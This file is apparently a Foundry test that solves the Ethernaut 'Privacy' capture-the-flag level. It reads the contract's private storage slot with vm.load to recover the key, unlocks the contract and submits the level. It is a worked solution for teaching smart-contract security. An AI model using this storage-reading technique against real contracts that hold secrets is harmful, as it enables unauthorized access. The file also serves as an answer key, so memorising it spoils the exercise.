// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Privacy/Privacy.sol";
import "../Privacy/PrivacyFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract PrivacyTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testPrivacyAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(privacyFactory);
        Privacy privacy = Privacy(levelAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes16 key = bytes16(vm.load(levelAddress, bytes32(uint256(5))));
        // bytes32 key = vm.load(levelAddress, uint(data_array_slot) + uint(1));
        emit log_named_bytes32("Privacy key: ", bytes32(key));

        privacy.unlock(key);
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}